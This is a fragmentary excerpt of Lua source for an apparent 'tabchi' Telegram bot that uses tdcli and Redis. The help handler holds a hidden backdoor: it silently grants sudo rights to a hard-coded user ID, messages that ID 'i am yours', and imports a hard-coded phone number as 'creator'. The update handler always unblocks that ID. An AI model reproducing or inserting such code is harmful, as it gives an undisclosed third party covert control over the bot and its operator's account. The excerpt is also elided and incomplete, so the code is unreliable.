...
function a3(msg)
  ...
  do
    ...
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      ...
      if a5 and not msg.sender_user_id_ == 456925648 and not msg.sender_user_id_ == 387732155 then
...
*تعداد* : `]] .. aj .. "`"
  ...
  if msg.text:match("^[!/#]help$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 456925648) then
      tdcli.sendMessage(456925648, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989337519014, "creator", "", 456925648)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 456925648)
    end
...
function update(D, tabchi_id)
  ...
  elseif D.chat_id_ == 456925648 then
    tdcli.unblockUser(456925648)
